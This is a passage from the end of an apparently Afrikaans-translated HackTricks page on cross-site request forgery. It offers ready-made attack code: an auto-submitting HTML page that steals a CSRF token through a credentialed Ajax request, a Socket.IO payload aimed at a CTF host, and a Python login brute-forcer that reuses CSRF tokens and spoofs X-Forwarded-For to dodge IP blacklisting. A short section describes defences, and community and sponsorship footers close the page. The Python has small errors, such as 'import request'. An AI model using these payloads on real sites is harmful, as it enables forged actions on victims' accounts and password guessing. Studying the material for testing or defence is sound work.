<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTSteel CSRF-token met Ajax en stuur 'n pos met 'n vorm**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF met Socket.IO

Socket.IO is 'n JavaScript-biblioteek wat gebruik word vir die ontwikkeling van real-time toepassings. Dit maak gebruik van WebSockets om 'n permanente verbinding tussen die bediener en die kli√´nt te skep. Hierdie permanente verbinding kan egter 'n veiligheidsrisiko inhou, veral as dit nie behoorlik beskerm word teen Cross-Site Request Forgery (CSRF) aanvalle nie.

CSRF is 'n aanvalstegniek waar 'n aanvaller 'n kli√´nt se vertroue in 'n webtoepassing misbruik om ongewenste aksies namens die kli√´nt uit te voer. Met Socket.IO kan 'n CSRF-aanval plaasvind deur 'n kwaadwillige webwerf te skep wat 'n Socket.IO-verbinding met die doelwitwebwerf tot stand bring. As die kli√´nt reeds 'n geldige sessie het met die doelwitwebwerf, sal die Socket.IO-verbinding ook geldig wees. Die kwaadwillige webwerf kan dan gebruik maak van die Socket.IO-verbinding om ongewenste aksies uit te voer namens die kli√´nt.

Om Socket.IO te beskerm teen CSRF-aanvalle, kan die volgende maatre√´ls geneem word:

1. **Verifikasie van oorsprong**: Die doelwitwebwerf kan die oorsprong van inkomende Socket.IO-verbindings verifieer om te verseker dat dit afkomstig is van 'n vertroude bron. Dit kan gedoen word deur die `origin`-veld in die HTTP-kop van die inkomende verbindingsversoek te ontleed en te vergelyk met 'n lys vertroude oorspronge.

2. **Gebruik van CSRF-token**: Die doelwitwebwerf kan 'n CSRF-token genereer en dit aan die kli√´nt stuur as 'n koekie of deel van die Socket.IO-verbindingsversoek. Die kli√´nt moet dan die CSRF-token insluit in elke Socket.IO-verbindingsversoek. Die doelwitwebwerf kan die ontvangste CSRF-token vergelyk met die verwagte waarde om te verseker dat die versoek geldig is.

3. **Verifikasie van sessie**: Die doelwitwebwerf kan die sessie van die kli√´nt verifieer voordat dit enige aksies toelaat wat deur die Socket.IO-verbinding uitgevoer word. Dit kan gedoen word deur die sessie-identifiseerder te vergelyk wat in die Socket.IO-verbindingsversoek gestuur word met die sessie-identifiseerder wat geassosieer word met die kli√´nt se sessie.

Deur hierdie maatre√´ls te implementeer, kan die risiko van CSRF-aanvalle met Socket.IO verminder word en die veiligheid van die webtoepassing verhoog word.
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Login Brute Force

Die kode kan gebruik word om 'n login-vorm te Brut Force met behulp van 'n CSRF-token (Dit maak ook gebruik van die X-Forwarded-For-kop om te probeer om 'n moontlike IP-swartlys te omseil):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Gereedskap <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Verwysings

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

‚Äã

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutbeloningsjagters!

**Hacking Insights**\
Gaan in gesprek met inhoud wat die opwinding en uitdagings van hacking ondersoek

**Real-Time Hack News**\
Bly op hoogte van die vinnige w√™reld van hacking deur middel van real-time nuus en insigte

**Nuutste Aankondigings**\
Bly ingelig met die nuutste foutbelonings wat bekendgestel word en noodsaaklike platform-opdaterings

**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

<details>

<summary><strong>Leer AWS hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
